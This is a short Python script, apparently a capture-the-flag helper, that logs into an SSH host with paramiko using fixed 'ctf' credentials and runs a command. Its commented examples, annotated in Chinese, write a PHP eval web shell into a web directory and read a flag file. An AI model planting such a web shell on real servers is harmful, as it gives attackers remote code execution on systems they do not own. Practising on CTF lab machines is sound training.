#-*- coding:utf-8 -*-
# coding:utf-8
import paramiko
ip = '10.1.1.1'
port = '22'
username = 'ctf'
passwd = 'ctf'
#private_key_path = '/home/auto/.ssh/id_rsa'  # 如果要用密钥登录
#private_key_path = "D:\\123.txt"
#key = paramiko.RSAKey.from_private_key_file(private_key_path)

cmd= 'ls';
# 当然，也可以使用下面提供多个命令，例如
# cmd = 'echo "<?php @eval(\$_POST[password]); ?>" > /www/admin/webshell.php'         写入www目录中
# cmd = 'cat /www/admin/flag.txt'           #读取txt文件

def ssh_base_pwd(ip,port,username,passwd,cmd):
    port = int(port)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=ip, port=port, username=username, password=passwd) #密码登录
    #ssh.connect(ip,port,username,key);   #密钥登录
    stdin,stdout,stderr = ssh.exec_command(cmd)
    result = stdout.read()
    if not result :
        print("无结果!")
        result = stderr.read()
    ssh.close()
    return result.decode()
a = ssh_base_pwd(ip,port,username,passwd,cmd)
print(a)